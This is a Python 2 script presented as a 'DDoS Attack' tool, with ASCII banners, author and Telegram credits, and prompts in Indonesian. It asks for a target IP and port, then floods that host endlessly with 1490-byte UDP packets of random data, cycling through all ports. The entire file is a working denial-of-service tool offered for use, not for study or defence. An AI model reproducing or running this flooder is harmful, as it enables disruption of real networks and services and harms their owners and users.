import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

attack = """
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
"""

os.system('cls' if os.name == 'nt' else 'clear')
print (""" 
    ____  ____       _____    ___   __  __             __  
   / __ \/ __ \____ / ___/   /   | / /_/ /_____ ______/ /__
  / / / / / / / __ \\__ \   / /| |/ __/ __/ __ `/ ___/ //_/
 / /_/ / /_/ / /_/ /__/ /  / ___ / /_/ /_/ /_/ / /__/ ,<   
/_____/_____/\____/____/  /_/  |_\__/\__/\__,_/\___/_/|_|  
                           .:Created By LapanWasTaken:.                                
""")
print
print "[+] Author      : LapanWasTaken"
print "[+] github      : https://github.com/LapanWasTaken"
print "[+] Telegram    : t.me/Cendawann"
print "[~] Quote       : It is better to be hated for what you are than to be loved for what you are not."
print
ip = raw_input("masukkan IP : ")
port = input("masukkan PORT : ")

os.system('cls' if os.name == 'nt' else 'clear')
print(attack)
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
